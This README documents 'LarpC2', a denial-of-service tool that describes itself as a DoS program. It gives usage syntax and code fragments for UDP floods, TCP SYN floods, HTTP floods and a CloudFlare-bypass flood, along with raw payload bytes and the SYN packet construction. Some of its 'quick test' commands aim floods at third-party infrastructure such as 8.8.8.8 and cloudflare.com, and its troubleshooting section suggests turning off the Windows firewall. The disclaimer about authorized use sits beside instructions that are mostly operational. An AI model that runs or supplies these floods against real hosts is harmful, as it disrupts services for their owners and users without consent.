# LarpC2 - Advanced Network Stress Testing Framework

<div align="center">

![LarpC2 Logo](https://img.shields.io/badge/LarpC2-v2.0-blue?style=for-the-badge&logo=python)
![Python Version](https://img.shields.io/badge/Python-3.8%2B-green?style=for-the-badge&logo=python)
![License](https://img.shields.io/badge/License-MIT-red?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20Mac-lightgrey?style=for-the-badge)

**A Professional Network Stress Testing Tool for Security Professionals**

</div>

---

## 📋 Table of Contents
- [Overview](#overview)
- [Features](#features)
- [File Structure](#file-structure)
- [Installation Guide](#installation-guide)
- [Build Instructions](#build-instructions)
- [Tutorial](#tutorial)
  - [Getting Started](#getting-started)
  - [Main Menu](#main-menu)
  - [Layer 4 Attacks](#layer-4-attacks-tcpudp-flood)
  - [Layer 7 Attacks](#layer-7-attacks-http--cloudflare-bypass)
  - [Tools Menu](#tools-menu)
- [Command Reference](#command-reference)
- [Technical Details](#technical-details)
- [Legal and Ethical Guidelines](#legal-and-ethical-guidelines)
- [Troubleshooting](#troubleshooting)
- [Contributing](#contributing)
- [License](#license)

---

## 🔍 Overview

**LarpC2** is a comprehensive network stress testing framework developed by **Venex** for security professionals and network administrators. This powerful tool provides both Layer 4 and Layer 7 attack vectors, enabling thorough testing of network infrastructure resilience against various types of Distributed Denial of Service (DDoS) attacks.

> **⚠️ IMPORTANT: This tool is designed for LEGITIMATE STRESS TESTING PURPOSES ONLY. Use this software exclusively on systems you own or have explicit written authorization to test.**

### What Makes LarpC2 Special?

- **User-Friendly CLI**: Intuitive command-line interface with colorful banners
- **Dual-Layer Attacks**: Both network (Layer 4) and application (Layer 7) attacks
- **CloudFlare Bypass**: Special HTTP flood that can bypass CloudFlare protection
- **Built-in Tools**: GeoIP lookup, DNS resolution, and subnet calculators
- **Multi-Threading**: Highly optimized concurrent attack execution
- **Cross-Platform**: Works on Windows, Linux, and macOS
- **Auto-Install**: Automatically installs required dependencies

---

## ✨ Features

### Core Capabilities

| Feature | Description |
|---------|-------------|
| **Layer 4 Attacks** | TCP SYN Flood, UDP Flood with multiple payloads |
| **Layer 7 Attacks** | HTTP GET Flood, CloudFlare Bypass |
| **Multi-Threading** | Configurable thread count for maximum performance |
| **User-Agent Randomization** | 20+ realistic user-agents for HTTP attacks |
| **Payload Variation** | Multiple UDP payloads for better evasion |
| **GeoIP Lookup** | Real-time IP geolocation information from ip-api.com |
| **DNS Resolution** | Domain to IP address lookup |
| **Subnet Calculator** | Network subnet information tool |
| **Admin Privilege Check** | Automatic elevation on Windows |
| **Standalone EXE** | Can be compiled into a single executable file |

---

## 📁 File Structure

```
LarpC2/
├── larp.py          # Main application source code
├── buildexe.bat     # Windows build script for creating EXE
├── meow.ico         # Application icon (optional, for EXE)
└── README.md        # This documentation file
```

### File Descriptions

| File | Purpose |
|------|---------|
| **larp.py** | The complete LarpC2 application with all attack functions, tools, and menu system |
| **buildexe.bat** | Windows batch script to compile larp.py into a standalone LARP.exe using PyInstaller |
| **meow.ico** | Optional icon file for the compiled Windows executable |

---

## 🚀 Installation Guide

### Prerequisites

```bash
# Ensure Python 3.8+ is installed
python --version
```

### Method 1: Direct Run (Recommended)

1. **Download larp.py**
2. **Open terminal/command prompt**
3. **Run the tool:**
   ```bash
   python larp.py
   ```
4. **Dependencies auto-install** on first run

### Method 2: Manual Setup

```bash
# Install dependencies manually
pip install requests cloudscraper

# For raw socket attacks on Linux (optional)
sudo pip install scapy

# Run the tool
python larp.py
```

### Method 3: Windows Standalone EXE

1. **Download larp.py and buildexe.bat**
2. **Place meow.ico in same folder** (optional)
3. **Run the build script:**
   ```bash
   buildexe.bat
   ```
4. **Find LARP.exe** in the `dist` folder
5. **Run LARP.exe** (as Administrator)

### Platform-Specific Instructions

#### Windows
```bash
# Run as Administrator (required for raw socket attacks)
Right-click Command Prompt → Run as Administrator
cd C:\path\to\LarpC2
python larp.py
```

#### Linux/macOS
```bash
# Make executable and run
chmod +x larp.py
sudo python3 larp.py  # Sudo required for raw sockets
```

---

## 🏗️ Build Instructions (Creating EXE)

### Using buildexe.bat (Windows)

1. **Install PyInstaller:**
   ```bash
   pip install pyinstaller
   ```

2. **Prepare files:**
   ```
   LarpC2/
   ├── larp.py
   ├── buildexe.bat
   └── meow.ico    (optional)
   ```

3. **Run the build script:**
   ```bash
   buildexe.bat
   ```

4. **Find your EXE:**
   ```
   dist\LARP.exe
   ```

### Manual Build Command

```bash
# Basic build
pyinstaller --onefile --name=LARP.exe larp.py

# With icon
pyinstaller --onefile --name=LARP.exe --icon=meow.ico larp.py

# With hidden imports
pyinstaller --onefile --name=LARP.exe --hidden-import=cloudscraper larp.py
```

### Build Output
```
dist/
└── LARP.exe    # Standalone executable (~15-20 MB)
```

---

## 📖 Tutorial

### Getting Started

When you first run LarpC2, it will automatically:
1. Check for administrator privileges
2. Install required Python packages
3. Display the main menu

#### Starting the Tool

```bash
# On Windows
python larp.py
# Or run the compiled EXE
LARP.exe

# On Linux/macOS
python3 larp.py
# Or make executable and run
chmod +x larp.py
./larp.py
```

---

### Main Menu

```
          ╦  ╔═╗╦═╗╔═╗
          ║  ╠═╣╠╦╝╠═╝
          ╩═╝╩ ╩╩╚═╩ 
                    ╚═╦═══════════════════════════════════════════╦═╝
                ╚╦════╩═══════════════════════════════════════════╩════╦╝
                 ║          LarpC2 is a powerfull DoS Program.         ║
                 ║               Free, Opensource, Safe,               ║
                ╔╩═════════════════════════════════════════════════════╩╗

                ╚╦═════════════════════════════════════════════════════╦╝
                 ║  This is made by the one and only Venex dont skid.  ║
                 ║      Type help to see all available commands.       ║
                ╔╩═════════════════════════════════════════════════════╩╗
```

#### Available Commands

```
help     - Show all available commands
l4       - Enter Layer 4 (Network) attack menu
l7       - Enter Layer 7 (Application) attack menu
tools    - Enter tools menu (GeoIP, DNS, Subnet)
exit     - Exit LarpC2
```

#### Example Navigation
```bash
╔═══[root@LARP]
╚══> help    # Shows help menu
╔═══[root@LARP]
╚══> l4      # Enters Layer 4 menu
╔═══[root@LARP]
╚══> l7      # Enters Layer 7 menu
╔═══[root@LARP]
╚══> tools   # Enters tools menu
╔═══[root@LARP]
╚══> exit    # Exits the program
```

---

### Layer 4 Attacks (TCP/UDP Flood)

Layer 4 attacks target the network layer, overwhelming the target's network stack.

#### Entering Layer 4 Menu

```bash
╔═══[root@LARP]
╚══> l4
```

#### Layer 4 Menu Display

```
                              ╦  ╔═╗╦═╗╔═╗
                              ║  ╠═╣╠╦╝╠═╝
                              ╩═╝╩ ╩╩╚═╩ 
                     ╔═══════════════════════════╗
                     ║  - tcp      | TCP Flood   ║                    
                     ║  - udp      | UDP Flood   ║           
                     ╚═══════════════════════════╝
```

---

#### UDP Flood Attack

**Syntax:**
```
udp <IP> <PORT> <THREADS> <SECONDS>
```

**Example:**
```bash
udp 192.168.1.100 80 100 60
```

**Parameters:**
- `IP`: Target IP address
- `PORT`: Target port number
- `THREADS`: Number of concurrent threads
- `SECONDS`: Attack duration in seconds

**What It Does:**
- Sends UDP packets with various payloads
- Uses multiple payload types for evasion
- Highly effective for bandwidth saturation

**Payloads Used:**
```python
payloads = [
    b"\x08\xb2\x00\x21",
    b"\x08\xb2\x00",
    b"\xD8\x39\x84\x00",
]
```

**Attack Output:**
```
                    ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                   
     ╔══════════════════════════════════╗
     ║ METHODS: [UDP]                    ║
     ║ HOST: [192.168.1.100]            ║
     ║ COUNTRY: [United States]          ║
     ║ PORT: [80]                       ║
     ║ THREADS: [100]                    ║
     ║ TIME: [60]                        ║
     ╚══════════════════════════════════╝
```

**Quick Test Command:**
```bash
udp 8.8.8.8 53 50 10
```

---

#### TCP SYN Flood Attack

**Syntax:**
```
tcp <IP> <PORT> <THREADS> <SECONDS>
```

**Example:**
```bash
tcp 192.168.1.100 443 200 120
```

**Parameters:**
- Same as UDP flood

**What It Does:**
- Sends TCP SYN packets with randomized source ports
- Exhausts connection tables
- Uses raw sockets for packet crafting

**Technical Details:**
```python
# TCP packet structure
flags = 0b00000010  # SYN flag
src_port = random.randint(1024, 65535)
pkt = struct.pack('!HHIIBBHHH', 
    src_port,   # Random source port
    port,       # Target port
    0,          # Sequence number
    0,          # Ack number
    80,         # Data offset
    flags,      # TCP flags (SYN)
    8192,       # Window size
    0,          # Checksum (0 for kernel)
    0           # Urgent pointer
)
```

**Attack Output:**
```
                    ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                   
     ╔══════════════════════════════════╗
     ║ METHODS: [TCP]                    ║
     ║ HOST: [192.168.1.100]            ║
     ║ COUNTRY: [United States]          ║
     ║ PORT: [443]                      ║
     ║ THREADS: [200]                   ║
     ║ TIME: [120]                      ║
     ╚══════════════════════════════════╝
```

**Quick Test Command:**
```bash
tcp 8.8.8.8 80 50 10
```

---

### Layer 7 Attacks (HTTP & CloudFlare Bypass)

Layer 7 attacks target the application layer, simulating real user traffic.

#### Entering Layer 7 Menu

```bash
╔═══[root@LARP]
╚══> l7
```

#### Layer 7 Menu Display

```
                                  ╦  ╔═╗╦═╗╔═╗
                                  ║  ╠═╣╠╦╝╠═╝
                                  ╩═╝╩ ╩╩╚═╩  
                     ╔═══════════════════════════════════╗
                     ║  - http     | HTTP Flood          ║         
                     ║  - cfb      | CloudFlare bypass   ║
                     ╚═══════════════════════════════════╝
```

---

#### HTTP Flood Attack

**Syntax:**
```
http <URL> <THREADS> <SECONDS>
```

**Example:**
```bash
http https://example.com 50 30
```

**Parameters:**
- `URL`: Target URL (must include http:// or https://)
- `THREADS`: Number of concurrent threads
- `SECONDS`: Attack duration in seconds

**What It Does:**
- Sends HTTP GET requests with random user-agents
- Simulates legitimate web traffic
- Uses Python's requests library

**User-Agent Pool (20+ agents):**
```python
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15"
"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36"
# ... and many more
```

**Attack Output:**
```
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                    
      ╔══════════════════════════════════╗
      ║ METHODS: [HTTP]                  ║
      ║ URL: [https://example.com]       ║
      ║ THREADS: [50]                    ║
      ║ TIME: [30]                       ║
      ╚══════════════════════════════════╝
```

**Quick Test Command:**
```bash
http http://testphp.vulnweb.com 20 10
```

---

#### CloudFlare Bypass Attack

**Syntax:**
```
cfb <URL> <THREADS> <SECONDS>
```

**Example:**
```bash
cfb https://protected-site.com 100 60
```

**Parameters:**
- Same as HTTP flood

**What It Does:**
- Uses cloudscraper library to bypass CloudFlare
- Sends both GET and HEAD requests
- Emulates browser behavior
- Can bypass CloudFlare's DDoS protection

**Why This is Special:**
- Uses the cloudscraper library to handle JavaScript challenges
- Bypasses CloudFlare's anti-bot mechanisms
- More effective against protected sites
- Simulates real browser requests

**Code Implementation:**
```python
scraper = cloudscraper.create_scraper()
while time.time() < end_time:
    ua = random.choice(useragent)
    headers = {"User-Agent": ua}
    scraper.get(url, headers=headers, timeout=5)
    scraper.head(url, headers=headers, timeout=5)
```

**Attack Output:**
```
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                
        ╔══════════════════════════════════╗
        ║ METHODS: [CloudFlare Bypass]     ║
        ║ URL: [https://protected.com]     ║
        ║ THREADS: [100]                   ║
        ║ TIME: [60]                       ║
        ╚══════════════════════════════════╝
```

**Quick Test Command:**
```bash
cfb https://www.cloudflare.com 20 10
```

---

### Tools Menu

The tools menu provides utility functions for network reconnaissance.

#### Entering Tools Menu

```bash
╔═══[root@LARP]
╚══> tools
```

#### Tools Menu Display

```
                      ╔╦╗╔═╗╔═╗╦  ╔═╗
                       ║ ║ ║║ ║║  ╚═╗
                       ╩ ╚═╝╚═╝╩═╝╚═╝  
           ╔═══════════════════════════════════╗
           ║  - geoip   | geolocation ip       ║         
           ║  - dns     | DNS lockup           ║
           ║  - subnet  | Reverse DNS lockup   ║
           ╚═══════════════════════════════════╝
```

---

#### GeoIP Lookup

**Syntax:**
```
geoip <IP>
```

**Example:**
```bash
geoip 8.8.8.8
```

**What It Does:**
- Queries ip-api.com for IP information
- Returns: Country, Region, City, ISP, Coordinates, ZIP

**Output:**
```
            ╔══════════════════════════════════╗
            ║ IP: [8.8.8.8]                   ║
            ║ Country: [United States]        ║
            ║ Region: [California]            ║
            ║ City: [Mountain View]           ║
            ║ ISP: [Google LLC]               ║
            ║ Latitude: [37.4220]             ║
            ║ Longitude: [-122.0840]          ║
            ║ ZIP: [94043]                    ║
            ╚══════════════════════════════════╝
```

**Quick Test Command:**
```bash
geoip 1.1.1.1
```

---

#### DNS Lookup

**Syntax:**
```
dns <DOMAIN>
```

**Example:**
```bash
dns google.com
```

**What It Does:**
- Resolves domain name to IP address
- Uses Python's socket library

**Output:**
```
            ╔══════════════════════════════════╗
            ║ HOST: [google.com]              ║
            ║ DNS: [142.250.190.46]           ║
            ╚══════════════════════════════════╝
```

**Quick Test Command:**
```bash
dns youtube.com
```

---

#### Subnet Calculator

**Syntax:**
```
subnet <IP>
```

**Example:**
```bash
subnet 192.168.1.1
```

**What It Does:**
- Calculates network information for /24 subnet
- Returns: Subnet, Network Address, Broadcast, Netmask, Hosts

**Output:**
```
                ╔════════════════════════════════════════════════╗
                ║ IP       : [192.168.1.1]                      ║
                ║ SUBNET   : [192.168.1.0/24]                   ║
                ║ NET ADDR : [192.168.1.0]                      ║
                ║ BROADCAST: [192.168.1.255]                    ║
                ║ NETMASK  : [255.255.255.0]                    ║
                ║ HOSTS    : [256] addresses                    ║
                ╚════════════════════════════════════════════════╝
```

**Quick Test Command:**
```bash
subnet 10.0.0.1
```

---

## 📝 Command Reference

### Complete Command List

| Command | Syntax | Description |
|---------|--------|-------------|
| `help` | `help` | Display help menu |
| `exit` | `exit` | Exit LarpC2 |
| `l4` | `l4` | Enter Layer 4 attack menu |
| `l7` | `l7` | Enter Layer 7 attack menu |
| `tools` | `tools` | Enter tools menu |
| `udp` | `udp <IP> <PORT> <THREADS> <SECONDS>` | UDP flood attack |
| `tcp` | `tcp <IP> <PORT> <THREADS> <SECONDS>` | TCP SYN flood attack |
| `http` | `http <URL> <THREADS> <SECONDS>` | HTTP GET flood attack |
| `cfb` | `cfb <URL> <THREADS> <SECONDS>` | CloudFlare bypass attack |
| `geoip` | `geoip <IP>` | IP geolocation lookup |
| `dns` | `dns <DOMAIN>` | DNS resolution |
| `subnet` | `subnet <IP>` | Subnet information |

### Quick Reference Examples

```bash
# Layer 4 Attacks
udp 10.0.0.1 53 100 30          # DNS server UDP flood
tcp 10.0.0.1 22 50 120          # SSH server SYN flood

# Layer 7 Attacks
http https://test.com 200 60    # HTTP flood
cfb https://protected.com 150 45 # CloudFlare bypass

# Tools
geoip 1.1.1.1                   # Check CloudFlare DNS location
dns example.com                 # Resolve domain
subnet 10.0.0.1                 # Calculate subnet info
```

---

## 🔧 Technical Details

### Code Architecture

```python
# Main Components
1. Admin Check & Elevation
   - is_admin()
   - run_as_admin()

2. Attack Functions
   - udp_attack()
   - tcp_attack()
   - http_attack()
   - cloudflare()

3. Utility Functions
   - geoip()
   - dnslockup()
   - subnet()

4. Menu System
   - banner()
   - l4_banner()
   - l7_banner()
   - tools_banner()
   - layer4()
   - layer7()
   - tools()
   - main()

5. Auto-Install
   - install()
```

### Attack Payloads

#### UDP Payloads
```python
payloads = [
    b"\x08\xb2\x00\x21",
    b"\x08\xb2\x00",
    b"\xD8\x39\x84\x00",
]
```

#### TCP Packet Structure
```python
pkt = struct.pack('!HHIIBBHHH', 
    src_port,   # Random source port (1024-65535)
    port,       # Target port
    0,          # Sequence number
    0,          # Ack number
    80,         # Data offset
    flags,      # TCP flags (SYN = 0b00000010)
    8192,       # Window size
    0,          # Checksum (0 for kernel)
    0           # Urgent pointer
)
```

### Dependencies

| Package | Purpose | Installation |
|---------|---------|--------------|
| `requests` | HTTP requests, GeoIP API | `pip install requests` |
| `cloudscraper` | CloudFlare bypass | `pip install cloudscraper` |
| `scapy` | Raw socket operations | `sudo pip install scapy` |
| `struct` | TCP packet construction | Built-in |
| `threading` | Concurrent execution | Built-in |
| `socket` | Network operations | Built-in |
| `random` | Payload randomization | Built-in |

---

## ⚖️ Legal and Ethical Guidelines

### ✅ Legitimate Use Cases
- **Penetration Testing** with written authorization
- **Load Testing** of your own infrastructure
- **Security Research** in controlled environments
- **Educational Purposes** in cybersecurity training
- **Incident Response** practice scenarios

### ❌ Prohibited Uses
- **Attacking systems without explicit authorization**
- **Disrupting public or private services illegally**
- **Conducting criminal activities or cyber extortion**
- **Testing government or critical infrastructure**
- **Any use violating local, national, or international laws**

### 📜 Legal Responsibility
By using LarpC2, you agree to:
1. **Only test systems you own or have written permission to test**
2. **Comply with all applicable laws and regulations**
3. **Accept full responsibility for your actions**
4. **Not hold the developer liable for misuse**

### ⚠️ Warning Signs
- **Unauthorized testing** is illegal in most jurisdictions
- **Fines and imprisonment** for illegal DDoS attacks
- **Civil lawsuits** from affected parties
- **Permanent criminal record** for cyber crimes

---

## 🔧 Troubleshooting

### Common Issues and Solutions

| Issue | Solution |
|-------|----------|
| **Permission denied** | Run with sudo/Administrator privileges |
| **ModuleNotFoundError** | Install missing dependencies: `pip install requests cloudscraper` |
| **Connection refused** | Verify target is reachable and port is open |
| **High CPU usage** | Reduce thread count |
| **No traffic seen** | Check firewall settings and network configuration |

### Windows-Specific Issues

#### Admin Privileges
```bash
# Right-click and Run as Administrator
# Or use PowerShell as Admin
Start-Process python -Verb RunAs -ArgumentList "larp.py"
```

#### Firewall Configuration
```bash
# Temporarily disable Windows Firewall (not recommended)
netsh advfirewall set allprofiles state off

# Or add rule for LarpC2
netsh advfirewall firewall add rule name="LarpC2" dir=in action=allow program="C:\path\to\LARP.exe" enable=yes
```

### Linux-Specific Issues

#### Raw Socket Permissions
```bash
# Run with sudo
sudo python3 larp.py

# Or set capabilities
sudo setcap cap_net_raw+ep /usr/bin/python3
```

#### Dependency Issues
```bash
# Install system dependencies
sudo apt-get install python3-dev build-essential
sudo pip3 install requests cloudscraper scapy
```

### Performance Optimization

#### Windows Performance
```bash
# Use high-performance power plan
powercfg -setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c

# Increase system limits
netstat -ano | find "SYN"  # Check connection states
```

#### Linux Performance
```bash
# Increase system limits
sudo sysctl -w net.core.somaxconn=65535
sudo sysctl -w net.ipv4.tcp_tw_reuse=1
ulimit -n 65535

# Disable IPv6 (if not needed)
sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1
```

---

## 🤝 Contributing

We welcome contributions from the security community!

### How to Contribute

1. **Fork the repository**
2. **Create a feature branch**
   ```bash
   git checkout -b feature/amazing-feature
   ```
3. **Commit your changes**
   ```bash
   git commit -m 'Add amazing feature'
   ```
4. **Push to branch**
   ```bash
   git push origin feature/amazing-feature
   ```
5. **Open a Pull Request**

### Contribution Ideas

- New attack vectors
- Improved performance
- Additional user-agents
- More GeoIP data sources
- GUI interface
- API integration
- Documentation improvements

### Coding Standards
- Follow **PEP 8** style guide
- Write **clear comments** for complex code
- Test **before submitting** pull requests

---

## 📄 License

This project is licensed under the **MIT License**:

```
MIT License

Copyright (c) 2024 Venex

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

## 🙏 Acknowledgments

- **Venex** - Original creator and maintainer
- **ip-api.com** - Free GeoIP API
- **cloudscraper** - CloudFlare bypass library
- **Python Community** - For excellent libraries
- **Cybersecurity Community** - For testing and feedback

---

## 📞 Support

### Documentation
- **GitHub**: [LarpC2 Repository](https://github.com/venexdev/LarpC2)
- **Issues**: [Report Issues](https://github.com/venexdev/LarpC2/issues)

### Contact
- **Developer**: Venex
- **Telegram**: [@VenexDev](https://t.me/VenexDev)

---

<div align="center">

**[⬆ Back to Top](#larpc2---advanced-network-stress-testing-framework)**

**Made with ❤️ by the cybersecurity community**

*Remember: With great power comes great responsibility. Use LarpC2 ethically and legally.*

</div>

---

## 📊 Quick Start Guide

### For First-Time Users

1. **Download larp.py**
2. **Open terminal as Administrator**
3. **Run: `python larp.py`**
4. **Type `help` to see commands**
5. **Try `l4` for network attacks**
6. **Try `l7` for web attacks**
7. **Try `tools` for utilities**
8. **Type `exit` to quit**

### Recommended Testing Targets

**For Testing Only:**
```
http://testphp.vulnweb.com  # Vulnerable test site
http://httpbin.org          # HTTP testing endpoint
http://www.google.com       # Public (DO NOT TEST)
```

### Safety Tips

1. **Always get permission first**
2. **Test on your own systems**
3. **Use low thread counts for testing**
4. **Monitor target system resources**
5. **Stop immediately if issues occur**
6. **Document your testing procedures**

---

